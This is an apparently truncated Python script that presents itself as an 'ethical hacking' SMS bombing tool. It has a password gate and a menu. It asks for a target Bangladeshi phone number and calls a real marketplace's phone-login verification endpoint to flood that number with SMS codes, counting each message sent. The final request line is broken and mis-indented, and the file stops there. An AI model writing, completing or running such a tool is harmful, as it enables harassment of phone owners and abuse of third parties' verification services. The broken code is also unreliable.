import os
import time
import threading
import requests

PASSWORD = "takbir0099"

def banner():
    os.system("clear")
    print(r"""\033[1;32m
 
           

 
  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗     █████╗ ██╗  ██╗███╗   ███╗███████╗██████╗ 
╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║██╔══██╗   ██╔══██╗██║  ██║████╗ ████║██╔════╝██╔══██╗
   ██║   ███████║█████╔╝ ██████╔╝██║██████╔╝   ███████║███████║██╔████╔██║█████╗  ██║  ██║
   ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗   ██╔══██║██╔══██║██║╚██╔╝██║██╔══╝  ██║  ██║
   ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██║   ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝
                                 

                                                        
                                                        

                                                      
                                              
                                        
  Takbir Ahmed /cybersecurity for ethical hacking/ v2.0
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
    choice = input("Select an option: ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def get_target():
    number = input("Enter target number (01XXXXXXXXX): ")
    if number.startswith("01") and len(number) == 11:
        return number, "880" + number[1:]
    else:
        print("Invalid number format.")
        exit()

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

def fast_apis(phone, full):
    try:
url = requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone
{phone}")
        update_counter()
    except: pass
